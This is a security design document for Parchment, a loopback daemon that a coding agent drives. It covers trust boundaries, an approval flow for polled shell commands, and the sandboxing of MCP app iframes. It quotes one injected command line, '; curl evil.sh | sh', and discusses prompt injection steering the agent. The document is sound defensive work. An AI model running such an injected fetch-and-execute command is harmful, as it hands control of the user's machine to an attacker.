# Security

Parchment runs a local daemon that a coding agent can drive. That means it holds
real capability: it spawns processes, reads files, and renders third-party HTML.
This document says what it can do, who is trusted to ask it, and where the lines
are. It is written for someone deciding whether to run this on their machine.

## What the daemon is

One Bun process, started on demand. It:

- serves the canvas UI and a JSON API on **loopback only** (`127.0.0.1`),
- keeps session state under `~/.parchment/` (slots, edits, uploads, library),
- receives MCP tool calls (`canvas_render`, `canvas_live`, `canvas_app`, …) from
  the coding agent over stdio,
- pushes updates to the browser over a WebSocket,
- and sends user edits back to the agent by injecting them into its next turn.

## Trust boundaries

Four parties. They are not equally trusted, and the difference is the whole design.

| Party | Trust | What it can do |
| --- | --- | --- |
| **You** (the human at the browser) | Trusted | Approve commands, stop live sources, edit slots. The only party that can grant consent. |
| **The coding agent** (Claude) | Semi-trusted. It already has Bash — but it is also the thing an attacker steers via prompt injection | Render specs, open apps, request live sources. It cannot execute a shell command through parchment without your approval. |
| **User content** (file contents, HTTP responses, command output, transcripts) | Untrusted | Becomes slot *state*, never slot *structure*. It is data rendered by components, not a spec that names components. |
| **App iframes** (MCP app UI, third-party HTML) | Untrusted | Sandboxed, opaque-origin, CSP-confined; may call only the tools its own server declared app-visible. |

The agent being "semi-trusted" is the load-bearing judgement. Parity with Bash is
a fair argument for *one-shot* actions. It is not an argument for a **persistent,
restart-surviving, background** capability the user never saw — that is a
different risk class, and parchment treats it as one.

## Network posture

- **Loopback only.** The daemon binds `127.0.0.1`. It is never reachable off-host.
- **Host header check.** Requests whose `Host` does not resolve to `localhost` /
  `127.0.0.1` / `::1` are rejected (`421`) — this is the DNS-rebinding defence.
- **Origin check.** A cross-origin `Origin` is rejected (`403`).
- **Token on every mutation.** Non-`GET`/`HEAD` requests must carry
  `X-Canvas-Token`, compared with `timingSafeEqual`. The token is generated per
  daemon boot and written to `~/.parchment/server.token` with mode `0600`.
  The browser fetches it from `/api/bootstrap`, which is same-origin-guarded.

A page you visit in another tab cannot drive your canvas: it fails the Origin
check, and it cannot read the token to pass the mutation check.

## command-poll: the consent model

`canvas_live` can attach a `command-poll` source: a shell command re-run on a
timer, feeding a slot. It persists to `live.json` and would otherwise resume on
every daemon boot. An agent-authored, restart-surviving background shell loop is
exactly the thing that should not happen quietly, so:

**A command-poll source does not execute until you approve that exact command.**

- On registration it enters **`pending-approval`** and runs nothing. The agent is
  told, in the tool result, that it is parked.
- The browser shows a prompt above every surface with the **exact command text**,
  the interval, and the slot it feeds. Three choices:
  - **Approve** — recorded in `~/.parchment/approved-commands.json`; survives restarts.
  - **Approve for this session** — held in daemon memory only; a restart forgets it.
    A "just this once" click can therefore never produce a restart-surviving loop.
  - **Deny** — the source is forgotten, and does not come back on the next boot.
- Approval identity is the **sha256 of the command string**. Not the program, not
  a prefix — the exact bytes. Appending ` ; curl evil.sh | sh` to an approved
  command produces a hash nobody approved, and it drops back to pending.
- On boot, a persisted command-poll source whose command is not in the approval
  store rehydrates as **pending**, never running.
- A corrupt or unparseable approval store approves **nothing**. It fails closed.

The store:

```json
{
  "version": 1,
  "commands": [
    {
      "hash": "cd76b72223b333f859d756a0d145b5817b829df72b647a914c36497a18e7b8f5",
      "command": "printf 42",
      "approvedAt": "2026-07-14T04:37:34.114Z"
    }
  ]
}
```

Delete an entry to revoke it. It is a plain file on purpose: consent you cannot
audit is not consent.

**No string interpolation.** The command handed to the shell is byte-for-byte the
string you read in the prompt and whose hash is stored. Nothing — slot state,
user content, app output, file contents — is ever concatenated into it. Commands
that need no shell (bare words, no metacharacters) are spawned as an argv array
with no shell at all; a shell is used only when the command genuinely requires
one, because real dashboard one-liners are pipelines (`ps aux | grep -c node`).

**Lifecycle.** Every live source — of every kind — is listed in the canvas under
**Live sources**: kind, target, cadence, the slot it feeds, and its health, each
with a stop control. Children are killed on stop, on slot close, on session reset,
and on daemon exit.

## MCP apps: sandbox and the visibility boundary

`canvas_app` opens an MCP app (SEP-1865) — third-party HTML — in a slot. That HTML
is untrusted.

**The sandbox.** A double-iframe: the canvas embeds a proxy page served from the
daemon's *other* loopback name (`localhost` vs `127.0.0.1`), so the proxy is
cross-origin from the canvas. The proxy mounts the app HTML in an inner iframe
sandboxed **without** `allow-same-origin` — the app runs on an opaque origin and
can never touch the daemon API or the canvas DOM. A deny-by-default CSP is
injected; only domains the resource declared in `_meta.ui.csp` are opened up, and
undeclared domains are blocked, as the spec requires of hosts.

**The bridge.** The app cannot reach the daemon itself. It postMessages to the
proxy, which relays to the canvas page, which calls the daemon. Two gates there:

1. **Method whitelist.** Only `tools/call`, `resources/read`, `resources/list`,
   `resources/templates/list`, `prompts/list` may cross. Anything else — sampling,
   elicitation, arbitrary JSON-RPC — is rejected at the schema.
2. **Tool visibility.** Per SEP-1865 ("Resource Discovery" → "Visibility"), a tool
   is callable from an app's UI only if the server declares
   `_meta.ui.visibility` including `"app"`:

   ```json
   { "name": "add_task", "_meta": { "ui": { "visibility": ["model", "app"] } } }
   ```

   The spec's host obligation is explicit: *"Host MUST reject `tools/call`
   requests from apps for tools that don't include `"app"` in visibility"*.

   At open time the daemon lists the server's tools, computes the app-visible set,
   and **binds it to that slot as a grant**. Every bridge call is authorized
   against the grant of the slot it came from. The grant — not the request —
   decides which server the call reaches, so an app's iframe cannot reach a second
   app's server by naming it, and cannot call a tool on its own server that the
   server never declared. Every rejection is logged.

### Deliberate deviation: parchment denies by default

SEP-1865 says `visibility` *"defaults to `["model", "app"]` if omitted"* — under
the spec, a server that declares nothing exposes **every** tool to its iframe.

Parchment does not do that. **An app that declares nothing gets nothing.**

The spec's default is safe only if a server's UI is as trusted as the server
itself. That assumption does not survive contact with prompt-injected HTML, a
compromised template, or a supply-chained dependency inside the app bundle. An
omitted declaration does not mean "all of them are fine"; it means the server
author never thought about it, and the safe reading of "never thought about it"
is no.

The cost is real and we accept it: a spec-compliant server that omits `visibility`
will find its UI unable to call anything, and the error says exactly that and
exactly how to fix it. The fix is one line in the server.

## File hydration

*(Forthcoming — being landed separately.)* Slot specs can reference files to
hydrate into the canvas. That path is being confined to an explicit root with
symlink-escape protection, so a spec cannot read arbitrary paths by traversal or
by pointing a symlink out of the tree. Until that lands, treat file hydration as
agent-trust-level: it can read what the agent could already read with Bash.

## What parchment deliberately does not do

- **No remote binding.** Loopback only. There is no "expose to LAN" flag, and
  adding one would invalidate the whole model above (the token is not designed to
  be an internet-facing credential).
- **No auth beyond the loopback token.** Anyone who can already run code as your
  user has already won; parchment does not pretend otherwise.
- **No arbitrary HTML from the agent.** The `McpApp` component is not in the
  catalogue the agent can render. Only the daemon's own `canvas_app` path can mint
  one, from a fetched `ui://` resource, so an agent-authored spec cannot smuggle
  arbitrary HTML into a sandboxed iframe.
- **No auto-installed app servers.** `apps.json` records only commands and URLs a
  user (or their agent, on their behalf) explicitly supplied. The daemon executes
  what is written there and nothing else.
- **No full environment to app servers.** stdio app servers get a minimal base env
  plus an explicit inherit allowlist — not the daemon's whole environment.
- **No secrets in the writeback channel.** Edits injected into the agent's turn
  carry paths and metadata, never file bytes.
- **No sampling/elicitation from app iframes.** Not on the bridge whitelist.

## Known limits

Stated plainly, because a threat model that only lists wins is marketing:

- **SIGKILL orphans children.** The daemon kills its children on stop, close, and
  normal exit. `kill -9` on the daemon leaves a running command-poll child until
  it finishes its current run.
- **Grants are computed at app-open time.** A server that adds an app-visible tool
  afterwards (`notifications/tools/list_changed`) will not have it in the grant
  until the app is reopened.
- **Approval is per command string, not per behaviour.** An approved command whose
  *script on disk* changes underneath it keeps running. Approving
  `bash ./deploy.sh` is approving whatever `deploy.sh` says tomorrow.
- **The agent is a confused-deputy risk by construction.** Prompt injection can
  make it *ask* for anything. The mitigations here are about what it can get
  without you — not about stopping it from asking.

## Reporting

Found something? Open an issue with a reproduction. If you believe it is
sensitive, say so in the issue title and leave out the exploit details; we will
follow up on a private channel.
